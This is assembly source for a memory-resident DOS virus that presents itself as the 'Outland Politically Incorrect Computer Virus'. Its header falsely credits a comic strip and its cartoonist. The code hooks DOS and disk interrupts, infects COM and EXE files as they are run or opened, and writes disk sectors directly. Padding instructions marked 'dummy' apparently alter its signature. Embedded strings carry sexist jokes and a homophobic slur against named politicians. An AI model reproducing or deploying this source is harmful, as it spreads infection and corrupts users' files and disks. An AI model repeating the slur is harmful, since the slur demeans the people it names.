;************************
;*			*
;*    O U T L A N D     *
;*			*
;* by Berkeley Breathed *
;*			*
;*   5/24/1992   	*
;*			*
;* dist by Washington   *
;* Post Writers Group	*
;************************


;
;The Outland Politically Incorrect Computer Virus
;
;
;
;

code	segment
	assume	cs:code,ds:code
copyright:
	db	'Bill the Cat Lives! ',0

date_stamp:
	dd	05249200h
checksum:
	db	30
;
;
;
;
;
;

exit_exe:
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+call_adr+2]
	mov	word ptr cs:[si+patch+2],bx
	inc	bx				;dummy
	mov	bx,word ptr cs:[si+call_adr]
	mov	word ptr cs:[si+patch],bx
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+stack_pointer+2]
	mov	ss,ax				;dummy
	mov	ss,bx
	mov	sp,word ptr cs:[si+stack_pointer]
	db	0eah			;JMP XXXX:YYYY
patch:
	dd	0

;
;
;
;


exit_com:
	mov	di,100h
	add	si,offset my_save
	movsb
	movsw
        mov     sp,ds:[6]               ;:
                                        ;:
	mov	bx,ax			;dummy
	xor	bx,bx
	push	bx
	jmp	[si-11] 		;si+call_adr-top_file

;
;
;
nofdisk2:
	jmp	nofdisk
startup:
	call	relative
relative:
	pop	si			;SI = $
	sub	si,offset relative
	cld
	cmp	word ptr cs:[si+my_save],5a4dh
	je	exe_ok
	cli
        mov     sp,si                   ;:
                                        ;:
                                        ;:
        add     sp,offset top_file+100h ;:
                                        ;:
                                        ;:
        sti                             ;:
                                        ;:
	cmp	sp,ds:[6]
	jnc	exit_com
exe_ok:
	push	ax
	push	es
	push	si
	push	ds
	mov	di,si

;
;
;

	xor	ax,ax
	push	ax
	mov	ds,ax
	mov	ax,cx			;dummy
	les	ax,ds:[13h*4]
	mov	word ptr cs:[si+fdisk],ax
	mov	word ptr cs:[si+fdisk+2],es
	mov	word ptr cs:[si+disk],ax
	mov	word ptr cs:[si+disk+2],es
	mov	ax,3344h		;dummy
        mov     ax,ds:[40h*4+2]         ;:
                                        ;:
                                        ;:
        cmp     ax,0f000h               ;:
                                        ;:
                                        ;:
	jne	nofdisk2
	mov	word ptr cs:[si+disk+2],ax
	mov	ax,ds:[40h*4]
	mov	word ptr cs:[si+disk],ax
	mov	dl,80h
        mov     ax,ds:[41h*4+2]         ;:
                                        ;:
                                        ;:
        cmp     ax,0f000h               ;:
                                        ;:
                                        ;:
	je	isfdisk
	cmp	ah,0c8h
	jc	nofdisk
	cmp	ah,0f4h
	jnc	nofdisk
	test	al,7fh
	jnz	nofdisk
	mov	ds,bx			;dummy
	mov	ds,ax
	cmp	ds:[0],0aa55h
	jne	nofdisk
	mov	dl,ds:[2]
isfdisk:
	mov	ds,ax
	xor	dh,dh
	mov	cl,8			;dummy
	mov	cl,9
	shl	dx,cl
	mov	cx,dx
	xor	si,si
findvect:
        lodsw                           ;:
                                        ;:
	cmp	ax,0fa80h		;	CMP	DL,80h
        jne     altchk                  ;       JNC     (       )
	lodsw
	cmp	ax,6969h		;dummy
	cmp	ax,7380h
	je	intchk
	jne	nxt0
altchk:
        cmp     ax,0c2f6h               ;:
                                        ;:
	jne	nxt			;	TEST	DL,80h
        lodsw                           ;       JNZ     (        )
	cmp	ax,7580h
	jne	nxt0
intchk:
	dec	si			;dummy
	inc	si			;dummy
        inc     si                      ;:
                                        ;:
	lodsw				;	INT	40h
	cmp	ax,40cdh
	je	found
	sub	si,3
nxt0:
	dec	si
	dec	si
nxt:
	inc 	si			;dummy
	dec	si			;dummy
	dec	si
	loop	findvect
	jmp	short nofdisk
found:
	sub	si,7
	mov	word ptr cs:[di+fdisk],si
	mov	word ptr cs:[di+fdisk+2],ds
nofdisk:
	mov	si,di
	nop				;dummy
	pop	ds

;:
;:
;:

	les	ax,ds:[21h*4]
	mov	word ptr cs:[si+save_int_21],ax
	mov	word ptr cs:[si+save_int_21+2],es
	push	cs
	nop				;dummy
	pop	ds
	cmp	ax,offset int_21
	jne	bad_func
	xor	di,di
	mov	cx,4433h		;dummy
	mov	cx,offset my_size
scan_func:
	lodsb
	scasb
	jne	bad_func
	loop	scan_func
	mov	es,ax			;dummy
	pop	es
	jmp	go_program

;:
;:
;:
;:
;:
;:
;:
go_shit:jmp	go_program

bad_func:
	pop	es
	mov	ah,49h
        call	int21h
	mov	bx,0ffffh
	mov	ah,47h			;dummy
	mov	ah,48h
	call	int21h
	sub	bx,(top_bz+my_bz+1ch-1)/16+2
	jc	go_shit
	mov	cx,es
	stc
	adc	cx,bx
	mov	ah,4ah
	call	int21h
	mov	bx,(offset top_bz+offset my_bz+1ch-1)/16+1
	stc
	sbb	es:[2],bx
	push	es
	mov	es,cx
	mov	ah,33h			;dummy
	mov	ah,4ah
	call	int21h
	mov	ax,es
	dec	ax
	mov	ds,ax
	mov	word ptr ds:[1],8
	call	mul_16
	mov	bx,ax
	mov	cx,dx
	pop	ds
	mov	ax,7654h		;dummy
	mov	ax,ds
	call	mul_16
	add	ax,ds:[6]
	adc	dx,0
	sub	ax,bx
	sbb	dx,cx
	jc	mem_ok
        sub     ds:[6],ax               ;:
                                        ;:
                                        ;:
mem_ok:
	pop	si
	push	si
	push	ds
	push	cs
	mov	di,0			;dummy
	xor	di,di
	mov	ds,di
	lds	ax,ds:[27h*4]
	mov	word ptr cs:[si+save_int_27],ax
	mov	word ptr cs:[si+save_int_27+2],ds
	pop	ds
	mov	cx,offset aux_size
	rep	movsb
	mov	ax,2367h		;dummy
	xor	ax,ax
	mov	ds,ax
        mov     ds:[21h*4],offset int_21;:
                                        ;:
                                        ;:
	mov	ds:[21h*4+2],es
	mov	ds:[27h*4],offset int_27
	mov	ds:[27h*4+2],es
	mov	word ptr es:[filehndl],ax
	pop	es
go_program:
	pop	si

;:
;:
;:
;:

	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[13h*4]
	mov	word ptr cs:[si+save_int_13],ax
	mov	ax,2468h		;dummy
	mov	ax,ds:[13h*4+2]
	mov	word ptr cs:[si+save_int_13+2],ax
	mov	ds:[13h*4],offset int_13
	add	ds:[13h*4],si
	mov	ds:[13h*4+2],cs
	pop	ds
	push	ds
	push	si
	mov	bx,1234h		;dummy
	mov	bx,si
	lds	ax,ds:[2ah]
	xor	si,si
	mov	dx,si
scan_envir:                             ;:
                                        ;:
                                        ;:
        lodsw                           ;:
                                        ;:
                                        ;:
	dec	si
	test	ax,ax
	jnz	scan_envir
	add	si,3
	lodsb

;:
;:
;:
;:
;:

	sub	al,'A'
	mov	cx,1
	push	cs
	pop	ds
	add	bx,offset int_27
	push	ax
	push	bx
	push	cx
	int	25h
	mov	ax,234h			;dummy
	pop	ax
	pop	cx
	pop	bx
	inc	byte ptr [bx+0ah]
        and     byte ptr [bx+0ah],0fh   ;:
                                        ;:
                                        ;:
        jnz     store_sec               ;:
                                        ;:
                                        ;:
	mov	al,[bx+10h]
	xor	ah,ah
	mul	word ptr [bx+16h]
	add	ax,[bx+0eh]
	push	ax
	mov	ax,0			;dummy
	mov	ax,[bx+11h]
	mov	dx,32
	mul	dx
	div	word ptr [bx+0bh]
	pop	dx
	add	dx,ax
	mov	ax,[bx+8]
	add	ax,40h
	cmp	ax,[bx+13h]
	jc	store_new
	inc	ax
	and	ax,3fh
	add	ax,dx
	cmp	ax,[bx+13h]
	jnc	small_disk
store_new:
	mov	[bx+8],ax
store_sec:
	pop	ax
	xor	dx,dx
	push	ax
	push	bx
	push	cx
	nop				;dummy
	int	26h

;:
;:
;:
;:
;:
;:
;:
;:
;:


	pop	ax
	pop	cx
	pop	bx
	pop	ax
	cmp	byte ptr [bx+0ah],0
	jne	not_now
	mov	dx,[bx+8]
	pop	bx
	push	bx
	nop				;dummy
	int	26h
small_disk:
	pop	ax
not_now:
	pop	si
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr cs:[si+save_int_13]
	mov	ds:[13h*4],ax
	mov	ax,word ptr cs:[si+save_int_13+2]
	mov	ds:[13h*4+2],ax
	pop	ds
	mov	ah,33h			;dummy
	pop	ax
	cmp	word ptr cs:[si+my_save],5a4dh
	jne	go_exit_com
	jmp	exit_exe
go_exit_com:
	jmp	exit_com
int_24:
        mov     al,3                    ;:
                                        ;:

	nop				;dummy
	iret

;:

	db	'by Oliver Wendell Jones ',0
	db	'Politically Incorrect Personal Computers Presents: ',0
	db	'the OLIVER VIRUS!  Nya Ha Ha! ',0
	db	'Men Rule! ',0
	db	'America Kicks Butt! ',0
	db	'Rap Sucks! ',0
	db	'Eat Fatty Food! ',0
	db	'Dames Melt Like Jell-O for Naughty Men! ',0
	db	'Ted Kennedy Sucks Barney Frank`s Fag Cock! ',0


;:
;:
;:

int_27:
	pushf
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_27]

;:
;:
;:
;:
;:
;:
;:
;:
;:

set_int_27:
	mov	word ptr cs:[save_int_27],dx
	mov	word ptr cs:[save_int_27+2],ds
	popf
	iret
set_int_21:
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	popf
	iret
get_int_27:
	les	bx,dword ptr cs:[save_int_27]
	popf
	iret
get_int_21:
	les	bx,dword ptr cs:[save_int_21]
	popf
	iret

exec:
	call	do_file
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_21]

	db	'Berk B.',0

;:
;:
;:
;:
;:
;:
;:
;:
;:
;:
;:
;:


int_21:
	push	bp
	mov	bp,sp
	push	[bp+6]
	popf
	pop	bp
	pushf
	call	ontop
	cmp	ax,2521h
	je	set_int_21
	cmp	ax,2527h
	je	set_int_27
	cmp	ax,3521h
	je	get_int_21
	cmp	ax,3527h
	je	get_int_27
	cld
	cmp	ax,4b00h
	je	exec
	cmp	ah,3ch
	je	create
	cmp	ah,3eh
	je	close
	cmp	ah,5bh
	jne	not_create
create:
        cmp     word ptr cs:[filehndl],0;:
                                        ;:
                                        ;:
	jne	dont_touch
	call	see_name
	jnz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	es
	push	cs
	pop	es
	push	si
	push	di
	push	cx
	push	ax
	mov	di,offset filehndl
	stosw
	mov	si,dx
	mov	cx,65
move_name:
	lodsb
	stosb
	test	al,al
	jz	all_ok
	loop	move_name
	mov	word ptr es:[filehndl],cx
all_ok:
	pop	ax
	pop	cx
	pop	di
	pop	si
	pop	es
go_exit:
	popf
	jnc	int_exit		;JMP
close:
	cmp	bx,word ptr cs:[filehndl]
	jne	dont_touch
	test	bx,bx
	jz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	ds
	push	cs
	pop	ds
	push	dx
	mov	dx,offset filehndl+2
	call	do_file
	mov	word ptr cs:[filehndl],0
	pop	dx
	pop	ds
	jmp	go_exit
not_create:
	cmp	ah,3dh
	je	touch
	cmp	ah,43h
	je	touch
        cmp     ah,56h                  ;:
                                        ;:
                                        ;:
                                        ;:
        jne     dont_touch              ;:
                                        ;:
                                        ;:
                                        ;:
touch:
	call	see_name
	jnz	dont_touch
	call	do_file
dont_touch:
	call	alloc
	popf
	call	function
int_exit:
	pushf
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'Z'
	pop	ds
	popf
dummy	proc	far			;???
	ret	2
dummy	endp

;:
;:
;:
;:

see_name:
	push	ax
	push	si
	mov	si,dx
scan_name:
	lodsb
	test	al,al
	nop				;dummy
	jz	bad_name
	cmp	al,'.'
	jnz	scan_name
	call	get_byte
	mov	ah,al
	nop				;dummy
	call	get_byte
	cmp	ax,'co'
	nop				;dummy
	jz	pos_com
	cmp	ax,'ex'
	nop				;dummy
	jnz	good_name
	call	get_byte
	cmp	al,'e'
	jmp	short good_name
pos_com:
	call	get_byte
	cmp	al,'m'
	jmp	short good_name
bad_name:
	inc	al
good_name:
	pop	si
	pop	ax
	ret

;:
;:
;:
;:


get_byte:
	lodsb
	cmp	al,'C'
	jc	byte_got
	cmp	al,'Y'
	jnc	byte_got
	add	al,20h
byte_got:
	ret

;:
;:
;:

function:
	pushf
	call	dword ptr cs:[save_int_21]
	ret


;:
;:
;:

do_file:
        push    ds                      ;:
                                        ;:
                                        ;:
	push	es
	push	si
	push	di
	push	ax
	push	bx
	push	cx
	push	dx
	mov	si,ds
	xor	ax,ax
	mov	ds,ax
        les     ax,ds:[24h*4]           ;:
                                        ;:
                                        ;:
        push    es                      ;:
                                        ;:
                                        ;:
	push	ax
	mov	ds:[24h*4],offset int_24
	mov	ds:[24h*4+2],cs
	les	ax,ds:[13h*4]
	mov	word ptr cs:[save_int_13],ax
	mov	word ptr cs:[save_int_13+2],es
	mov	ds:[13h*4],offset int_13
	mov	ds:[13h*4+2],cs
	push	es
	push	ax
	mov	ds,si
        xor     cx,cx                   ;:
                                        ;:
                                        ;:
                                        ;:
	mov	ax,4300h
	call	function
	mov	bx,cx
	and	cl,0feh
	cmp	cl,bl
	je	dont_change
	mov	ax,4301h
	call	function
	stc
dont_change:
	pushf
	push	ds
	push	dx
	push	bx
        mov     ax,3d02h                ;:
                                        ;:
                                        ;:
        call    function                ;:
                                        ;:
                                        ;:
	jc	cant_open
	mov	bx,ax
	call	disease
        mov     ah,3eh                  ;:
                                        ;:
                                        ;:
	call	function
cant_open:
	pop	cx
	pop	dx
	pop	ds
	popf
	jnc	no_update
        mov     ax,4301h                ;:
                                        ;:
                                        ;:
                                        ;:
        call    function                ;:
                                        ;:
                                        ;:
                                        ;:
no_update:
        xor     ax,ax                   ;:
                                        ;:
                                        ;:
                                        ;:
	mov	ds,ax
	pop	ds:[13h*4]
	pop	ds:[13h*4+2]
	pop	ds:[24h*4]
	pop	ds:[24h*4+2]
        pop     dx                      ;:
                                        ;:
                                        ;:
                                        ;:
	pop	cx
	pop	bx
	pop	ax
	pop	di
	pop	si
	pop	es
	pop	ds
	ret


;:
;:
;:
;:

disease:
	push	cs
	pop	ds
	push	cs
	pop	es
        mov     dx,offset top_save      ;:
                                        ;:
                                        ;:
	mov	cx,18h
	mov	ah,3fh
	call	int21h
	xor	cx,cx
	xor	dx,dx
        mov     ax,4202h                ;:
                                        ;:
                                        ;:
                                        ;:

	call	int21h
	mov	word ptr [top_save+1ah],dx
        cmp     ax,offset my_size       ;:
                                        ;:
                                        ;:
                                        ;:
	sbb	dx,0
        jc      stop_fuck_2             ;:
                                        ;:
                                        ;:
                                        ;:
	mov	word ptr [top_save+18h],ax
	cmp	word ptr [top_save],5a4dh
	jne	com_file
	mov	ax,word ptr [top_save+8]
	add	ax,word ptr [top_save+16h]
	call	mul_16
	add	ax,word ptr [top_save+14h]
	adc	dx,0
	mov	cx,dx
	mov	dx,ax
	jmp	short see_sick
com_file:
	cmp	byte ptr [top_save],0e9h
	jne	see_fuck
	mov	dx,word ptr [top_save+1]
	add	dx,103h
	jc	see_fuck
	dec	dh
	xor	cx,cx

;:
;:
;:
;:


see_sick:
	sub	dx,startup-copyright
	sbb	cx,0
	mov	ax,4200h
	call	int21h
	add	ax,offset top_file
	adc	dx,0
	cmp	ax,word ptr [top_save+18h]
	jne	see_fuck
	cmp	dx,word ptr [top_save+1ah]
	jne	see_fuck
	mov	dx,offset top_save+1ch
	mov	si,dx
	mov	cx,offset my_size
	mov	ah,3fh
	call	int21h
	jc	see_fuck
	cmp	cx,ax
	jne	see_fuck
	xor	di,di
next_byte:
	lodsb
	scasb
	jne	see_fuck
	loop	next_byte
stop_fuck_2:
	ret
see_fuck:
        xor     cx,cx                   ;:
                                        ;:
                                        ;:
                                        ;:
	xor	dx,dx
	mov	ax,4202h
	call	int21h
	cmp	word ptr [top_save],5a4dh
	je	fuck_exe
        add     ax,offset aux_size+200h ;:
                                        ;:
                                        ;:
                                        ;:
	adc	dx,0
	je	fuck_it
	ret

;:
;:
;:
;:

fuck_exe:
	mov	dx,word ptr [top_save+18h]
	neg	dl
	and	dx,0fh
	xor	cx,cx
	mov	ax,4201h
	call	int21h
	mov	word ptr [top_save+18h],ax
	mov	word ptr [top_save+1ah],dx
fuck_it:
        mov     ax,5700h                ;:
                                        ;:
                                        ;:
                                        ;:
	call	int21h
	pushf
	push	cx
	push	dx
	cmp	word ptr [top_save],5a4dh
        je      exe_file                ;:
                                        ;:
                                        ;:
                                        ;:
	mov	ax,100h
	jmp	short set_adr
exe_file:
	mov	ax,word ptr [top_save+14h]
	mov	dx,word ptr [top_save+16h]
set_adr:
	mov	di,offset call_adr
	stosw
	mov	ax,0			;dummy
	mov	ax,dx
	stosw
	mov	ax,word ptr [top_save+10h]
	stosw
	mov	ax,word ptr [top_save+0eh]
	stosw
        mov     si,offset top_save      ;:
                                        ;:
                                        ;:
        movsb                           ;:
                                        ;:
                                        ;:
        movsw                           ;:
                                        ;:
                                        ;:
	xor	dx,dx
	mov	cx,offset top_file
	mov	ah,40h
        call	int21h                  ;:
                                        ;:
                                        ;:
        jc      go_no_fuck              ;:
                                        ;:
                                        ;:
	xor	cx,ax
	jnz	go_no_fuck
	mov	dx,cx
	mov	ax,4200h
	call	int21h
	cmp	word ptr [top_save],5a4dh
	je	do_exe
	mov	byte ptr [top_save],0e9h
	mov	ax,2233h		;dummy
	mov	ax,word ptr [top_save+18h]
	add	ax,startup-copyright-3
	mov	word ptr [top_save+1],ax
	mov	cx,3
	jmp	short write_header
go_no_fuck:
	jmp	short no_fuck

;:
;:
;:
;:

do_exe:
	call	mul_hdr
	not	ax
	not	dx
	inc	ax
	jne	calc_offs
	inc	dx
calc_offs:
	add	ax,word ptr [top_save+18h]
	adc	dx,word ptr [top_save+1ah]
	mov	cx,11h			;dummy
	mov	cx,10h
	div	cx
	mov	word ptr [top_save+14h],startup-copyright
	mov	word ptr [top_save+16h],ax
	nop				;dummy
	add	ax,(offset top_file-offset copyright-1)/16+1
	mov	word ptr [top_save+0eh],ax
	mov	word ptr [top_save+10h],100h
	add	word ptr [top_save+18h],offset top_file
	nop				;dummy
	adc	word ptr [top_save+1ah],0
	mov	ax,word ptr [top_save+18h]
	and	ax,1ffh
	mov	word ptr [top_save+2],ax
	pushf
	mov	ax,word ptr [top_save+19h]
	shr	byte ptr [top_save+1bh],1
	rcr	ax,1
	popf
	jz	update_len
	inc	ax
update_len:
	mov	word ptr [top_save+4],ax
	mov	cx,18h
write_header:
	mov	dx,offset top_save
	mov	ah,40h
        call	int21h                  ;:
                                        ;:
                                        ;:
                                        ;:
no_fuck:
	pop	dx
	pop	cx
	popf
	jc	stop_fuck
        mov     ax,5701h                ;:
                                        ;:
                                        ;:
                                        ;:
	call	int21h
stop_fuck:
	ret

;
;
;
;
;
;
;
;
;
;
;
;
;
;


alloc:
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'M'
	pop	ds

;:
;:
;:
;:
;:
;:
;:
;:

ontop:
	push	ds
	push	ax
	push	bx
	push	dx
	xor	bx,bx
	mov	ds,bx
	lds	dx,ds:[21h*4]
	nop				;dummy
	cmp	dx,offset int_21
	jne	search_segment
	mov	ax,ds
	mov	bx,cs
	cmp	ax,bx
	je	test_complete

;
;
;
;
;
;
;
;


	xor	bx,bx
search_segment:
	mov	ax,[bx]
	cmp	ax,offset int_21
	jne	search_next
	mov	ax,3322h		;dummy
	mov	ax,cs
	cmp	ax,[bx+2]
	je	got_him
search_next:
	inc	bx
	jne	search_segment
	je	return_control
got_him:
	mov	ax,word ptr cs:[save_int_21]
	mov	[bx],ax
	nop				;dummy
	mov	ax,word ptr cs:[save_int_21+2]
	mov	[bx+2],ax
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	xor	bx,bx

;
;
;
;
;
;

return_control:
	mov	ds,bx
	nop				;dummy
	mov	ds:[21h*4],offset int_21
	mov	ds:[21h*4+2],cs
test_complete:
	pop	dx
	pop	bx
	pop	ax
	pop	ds
	ret

;
;
;
;
get_chain:
	push	ax
	push	bx
	mov	ah,22h			;dummy
	mov	ah,61h			;mod'd
	inc	ah			;mod'd to 62h
	call	function
	mov	ax,cs
	dec	ax
	dec	bx
next_blk:
	mov	ds,ax			;dummy
	mov	ds,bx
	stc
	adc	bx,ds:[3]
	cmp	bx,ax
	jc	next_blk
	pop	bx
	pop	ax
	ret

;
;
;
;

mul_hdr:
	mov	ax,word ptr [top_save+8]
mul_16:
	mov	dx,10h
	mul	dx
	ret

int21h:	int	21h
	ret

	db	'Banana 6000 P.I.P.C. ' 
	db	'(C) I spell -Lightening- wrong! ',0

;
;
;
;
;
;
;
;


int_13:
	cmp	ah,22h			;dummy
	cmp	ah,3
	jnz	subfn_ok
	cmp	dl,80h
	jnc	hdisk
	db	0eah			;JMP XXXX:YYYY
my_size:                                ;:
                                        ;:
                                        ;:
                                        ;:
disk:
	dd	0
hdisk:
	db	0eah			;JMP XXXX:YYYY
fdisk:
	dd	0
subfn_ok:
	db	0eah			;JMP XXXX:YYYY
save_int_13:
	dd	0
call_adr:
	dd	100h

stack_pointer:
        dd      0                       ;:
                                        ;:
                                        ;:
                                        ;:
my_save:
        int     20h                     ;:
                                        ;:
                                        ;:
                                        ;:
        nop                             ;:
                                        ;:
                                        ;:
top_file:                               ;:
                                        ;:
                                        ;:
                                        ;:
filehndl    equ $
filename    equ filehndl+2              ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
save_int_27 equ filename+65             ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
save_int_21 equ save_int_27+4           ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
aux_size    equ save_int_21+4           ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
top_save    equ save_int_21+4           ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
                                        ;:
top_bz	    equ top_save-copyright
my_bz	    equ my_size-copyright
code	ends
	end

